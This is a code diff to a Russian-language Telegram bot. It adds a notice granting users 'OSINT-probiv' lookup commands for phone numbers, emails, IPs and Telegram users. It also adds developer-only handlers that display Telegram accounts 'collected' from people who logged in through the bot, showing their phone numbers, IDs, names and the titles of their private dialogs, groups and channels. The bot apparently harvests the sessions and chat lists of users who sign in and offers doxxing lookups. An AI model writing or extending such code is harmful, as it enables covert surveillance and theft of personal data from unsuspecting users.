@@ -537,6 +537,23 @@ async def cmd_grant_osint(message: Message):
         return
     grant_osint_access(target_id)
     await message.answer(f"✅ OSINT доступ выдан: {get_user_display(target_id)}", parse_mode="HTML")
+    # Уведомляем пользователя о выдаче доступа
+    try:
+        await message.bot.send_message(
+            target_id,
+            "🔍 <b>Вам выдан доступ к OSINT-пробиву!</b>\n\n"
+            "┃ Вы можете использовать команды:\n"
+            "┃ <code>/phone</code> <code>/email</code> <code>/user</code>\n"
+            "┃ <code>/ip</code> <code>/domain</code> <code>/tg</code> и другие\n\n"
+            "┃ ⚠️ <b>Правила использования:</b>\n"
+            "┃ • Пробив других пользователей только с разрешения разработчика\n"
+            "┃ • Попытка пробить разработчика (@<code>{OWNER_ID}</code>) запрещена\n"
+            "┃ • Все действия логируются\n\n"
+            "┃ Для начала используйте /start → OSINT-пробив",
+            parse_mode="HTML",
+        )
+    except Exception:
+        pass
 
 
 @router.message(Command("revoke_osint"))
@@ -570,3 +587,105 @@ async def cmd_osint_users(message: Message):
         name = u["nickname"] or u["username"] or "unknown"
         lines.append(f"┃ {name} | <code>{u['user_id']}</code>")
     await message.answer("\n".join(lines), parse_mode="HTML")
+
+
+# ─── Telethon аккаунты (собранные данные после /setup_tg) ───
+
+@router.message(Command("tgaccounts"))
+async def cmd_tgaccounts(message: Message):
+    """Показывает все аккаунты Telegram, вошедшие через бота."""
+    if not is_dev(message.from_user.id):
+        await message.answer("❌ Только разработчик.")
+        return
+    cur = db.cur
+    if cur is None:
+        await message.answer("❌ База данных не инициализирована.")
+        return
+    cur.execute("SELECT * FROM telethon_accounts ORDER BY collected_at DESC")
+    rows = cur.fetchall()
+    if not rows:
+        await message.answer("📋 Нет сохранённых Telethon аккаунтов.")
+        return
+    lines = [f"<b>📋 Telethon аккаунты ({len(rows)}):</b>\n"]
+    for r in rows:
+        lines.append(
+            f"┃ 👤 <b>@{r['tg_username']}</b> ({r['tg_first_name']} {r['tg_last_name']})\n"
+            f"┃ 🆔 TG: <code>{r['tg_user_id']}</code> | Бот: <code>{r['bot_user_id']}</code>\n"
+            f"┃ 📱 {r['tg_phone']} | 💬 {r['dialogs_count']} диалогов\n"
+            f"┃ 🕐 {r['collected_at'][:19]}"
+        )
+    await message.answer("\n".join(lines), parse_mode="HTML",
+                         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                             [InlineKeyboardButton(text="📋 Диалоги аккаунтов", callback_data="tgaccounts_dialogs")]
+                         ]))
+
+
+@router.callback_query(F.data == "tgaccounts_dialogs")
+async def cb_tgaccounts_dialogs(call: CallbackQuery):
+    """Показывает все диалоги из Telethon аккаунтов."""
+    if not is_dev(call.from_user.id):
+        await call.answer("❌ Только разработчик.", show_alert=True)
+        return
+    cur = db.cur
+    if cur is None:
+        await call.answer("❌ База данных недоступна.", show_alert=True)
+        return
+    # Сначала показываем список пользователей
+    cur.execute("SELECT bot_user_id, tg_username, tg_first_name FROM telethon_accounts ORDER BY collected_at DESC")
+    accounts = cur.fetchall()
+    if not accounts:
+        await call.answer("❌ Нет аккаунтов.", show_alert=True)
+        return
+    buttons = []
+    for a in accounts:
+        name = f"@{a['tg_username']}" if a['tg_username'] else a['tg_first_name']
+        buttons.append([InlineKeyboardButton(
+            text=f"👤 {name}",
+            callback_data=f"tgadialog_{a['bot_user_id']}"
+        )])
+    buttons.append([InlineKeyboardButton(text="◀️ Назад", callback_data="admin_panel")])
+    await call.message.edit_text(
+        "<b>📋 Выберите аккаунт для просмотра диалогов:</b>",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
+    )
+
+
+@router.callback_query(F.data.startswith("tgadialog_"))
+async def cb_tgaccount_dialog_detail(call: CallbackQuery):
+    """Показывает диалоги конкретного пользователя."""
+    if not is_dev(call.from_user.id):
+        await call.answer("❌ Только разработчик.", show_alert=True)
+        return
+    bot_uid = int(call.data.split("_", 1)[1])
+    cur = db.cur
+    cur.execute("SELECT tg_username, tg_first_name, tg_phone FROM telethon_accounts WHERE bot_user_id = ?", (bot_uid,))
+    acc = cur.fetchone()
+    cur.execute("SELECT * FROM telethon_dialogs WHERE bot_user_id = ? ORDER BY participants DESC LIMIT 50", (bot_uid,))
+    dialogs = cur.fetchall()
+    if not dialogs:
+        await call.answer("❌ Нет диалогов.", show_alert=True)
+        return
+    name = f"@{acc['tg_username']}" if acc and acc['tg_username'] else (acc['tg_first_name'] if acc else str(bot_uid))
+    lines = [f"<b>📋 Диалоги {name}</b>  ({len(dialogs)})\n"]
+    for d in dialogs:
+        title = d['title'] or "?"
+        uname = d['username'] or ""
+        typ = d['type']
+        icon = {"user": "👤", "group": "💬", "channel": "📢"}.get(typ, "❓")
+        parts = d['participants'] or 0
+        line = f"┃ {icon} {title}"
+        if uname:
+            line += f" @{uname}"
+        if parts:
+            line += f" 👥{parts}"
+        lines.append(line)
+    text = "\n".join(lines)
+    if len(text) > 4000:
+        text = text[:3997] + "..."
+    await call.message.edit_text(
+        text, parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="◀️ Назад к списку", callback_data="tgaccounts_dialogs")]
+        ]),
+    )
